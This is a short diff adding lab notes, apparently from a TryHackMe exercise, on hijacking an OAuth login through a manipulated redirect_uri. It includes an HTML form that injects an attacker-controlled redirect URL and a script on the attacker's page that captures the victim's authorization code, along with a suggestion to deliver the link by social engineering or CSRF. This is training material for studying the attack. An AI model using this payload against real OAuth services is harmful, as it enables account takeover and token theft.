@@ -1,0 +1,24 @@
+So, for this, we need to of taken control of a simple HTTP webpage within the network we are trying to work around.
+Then, we are trying to get a users token, and send it to us so we can log in as them.
+
+This is redirect HTML code for that purpose:
+ <form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">
+            <input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html">
+            <input type="submit" value="Hijack OAuth">
+        </form>
+
+This form sends a hidden redirect_uri parameter with the value http://dev.bistro.thm:8002/malicious_redirect.html and submits a request to http://coffee.thm:8000/oauthdemo/oauth_login/.  The malicious_redirect.html page then intercepts the authorization code from the URL using the following code:
+
+<script>
+            // Extract the authorization code from the URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code');
+            document.getElementById('auth_code').innerText = code;
+            console.log("Intercepted Authorization Code:", code);
+            // code to save the acquired code in database/file etc
+        </script>
+
+The attacker can send Tom the link (http://dev.bistro.thm:8002/redirect_uri.html) through social engineering tactics or a CSRF attack.
+ The victim, unsuspecting of the malicious intent, clicks on the link, which takes them to the URL dev.bistro.thm:8002/redirect_uri.html. 
+
+This gets their token, which we can then login to their account with.
